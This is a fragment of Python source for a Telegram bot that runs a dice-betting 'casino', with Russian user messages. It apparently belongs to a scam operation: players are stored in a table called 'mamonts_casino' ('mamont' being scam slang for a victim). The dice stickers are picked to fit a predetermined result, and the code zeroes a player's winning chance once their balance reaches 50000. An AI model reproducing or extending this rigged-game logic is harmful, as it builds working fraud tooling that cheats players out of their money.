                    await bot.send_sticker(message.from_user.id, random.choice([four_point, five_point, six_point]))
                    await message.answer("➖➖➖➖➖➖➖➖ \n"
                                         "  👆 Ваш кубик \n"
                                         "➖➖➖➖➖➖➖➖ \n"
                                         "  👇 Кубик бота \n"
                                         "➖➖➖➖➖➖➖➖")
                    await bot.send_sticker(message.from_user.id, random.choice([one_point, two_point, three_point]))
                    await message.answer(f"❤ Ваша ставка выиграла - выигрыш {int(message.text)} \n")
                    with sqlite3.connect(bd) as c:
                        c.execute("UPDATE mamonts_casino SET balance = balance + ?, wins = wins + 1, games = games + 1 WHERE id = ?",(message.text, message.from_user.id,))
                    await message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3] + int(message.text)}')
                    await statess.Dice.q1.set()
                else:
                    await bot.send_sticker(message.from_user.id, random.choice([one_point, two_point, three_point]))
                    await message.answer("➖➖➖➖➖➖➖➖ \n"
                                         "  👆 Ваш кубик \n"
                                         "➖➖➖➖➖➖➖➖ \n"
                                         "  👇 Кубик бота \n"
                                         "➖➖➖➖➖➖➖➖")
                    await bot.send_sticker(message.from_user.id, random.choice([four_point, five_point, six_point]))
                    await message.answer(f"💔 Ваша ставка проиграла - проигрыш {int(message.text)} \n")
                    with sqlite3.connect(bd) as c:
                        c.execute("UPDATE mamonts_casino SET balance = balance - ?, lose = lose + 1, games = games + 1 WHERE id = ?",(message.text, message.from_user.id,))
                    if info[3] <= 10:
                        await message.answer("❌❌ На балансе недостаточно средств ❌❌", reply_markup=menu.mainkb)
                        await state.finish()
                    else:
                        await message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3] - int(message.text)}')
                        await statess.Dice.q1.set()
            else:
                await bot.send_sticker(message.from_user.id, random.choice([one_point, two_point, three_point]))
                await message.answer("➖➖➖➖➖➖➖➖ \n"
                                     "  👆 Ваш кубик \n"
                                     "➖➖➖➖➖➖➖➖ \n"
                                     "  👇 Кубик бота \n"
                                     "➖➖➖➖➖➖➖➖")
                await bot.send_sticker(message.from_user.id, random.choice([four_point, five_point, six_point]))
                await message.answer(f"💔 Ваша ставка проиграла - проигрыш {int(message.text)} \n")
                with sqlite3.connect(bd) as c:
                    c.execute("UPDATE mamonts_casino SET balance = balance - ?, lose = lose + 1, games = games + 1 WHERE id = ?",(message.text, message.from_user.id,))
                if info[3] <= 10:
                    await message.answer("❌❌ На балансе недостаточно средств ❌❌", reply_markup=menu.mainkb)
                    await state.finish()
                else:
                    await message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {info[3] - int(message.text)}')
                    await statess.Dice.q1.set()
            if info[3] >= 50000:
                with sqlite3.connect(bd) as c:
                    c.execute("UPDATE mamonts_casino SET shans = shans + ? WHERE id = ?",('0', message.from_user.id,))
    except ValueError:
        await message.answer("Вы ввели не число!\nВыберите игру заново или вернитесь назад")
        await state.finish()

@dp.callback_query_handler(text_startswith="otmenilsuka",state="*") 
async def otmenaasuchka(call:types.CallbackQuery,state:FSMContext):
    await state.finish()
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    await bot.send_message(call.from_user.id,'Отмененно') 

executor.start_polling(dp)